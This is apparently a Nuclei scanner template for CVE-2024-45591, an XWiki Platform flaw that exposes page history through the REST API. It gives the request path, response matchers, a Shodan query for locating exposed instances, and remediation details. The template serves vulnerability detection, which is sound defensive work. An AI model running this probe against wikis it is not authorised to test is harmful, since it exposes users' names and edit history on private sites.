id: CVE-2024-45591

info:
  name: XWiki Platform - Unauthorized Document History Access
  author: pd-bot
  severity: medium
  description: |
    A vulnerability in XWiki Platform's REST API allows unauthorized users to access document history information. The REST API endpoint exposes the history of any page including modification times, version numbers, author details (username and display name), and version comments, regardless of access rights configuration, even on private wikis.
  impact: |
    An attacker can access document history of any known page
  remediation: |
    Upgrade to XWiki Platform version 15.10.9 or 16.3.0-rc-1 or later. No workarounds are available for earlier versions
  reference:
    - https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-pvmm-55r5-g3mm
    - https://jira.xwiki.org/browse/XWIKI-22052
    - https://nvd.nist.gov/vuln/detail/cve-2024-45591
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-45591
    cwe-id: CWE-359,CWE-862
    epss-score: 0.83024
    epss-percentile: 0.99234
    cpe: cpe:2.3:a:xwiki:platform:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    verified: true
    vendor: xwiki
    product: xwiki-platform
    shodan-query: http.html:"data-xwiki-reference"
  tags: cve,cve2024,xwiki,exposure,rest-api,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/xwiki/rest/wikis/xwiki/spaces/Main/pages/WebHome/history"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'version'
          - 'historySummary'
          - 'pageId'
          - 'comment'
        condition: and

      - type: status
        status:
          - 200
# digest: 490a0046304402205bca8270f4f55082d705e2a19a21fb9b48e076342590cc88a39b4a21566fe68c0220381bc7b3d7fb2bb0ab532c6cb88484ca13946ab90736f742bc8eb7ad3e3542d1:922c64590222798bb761d5b6d8e72950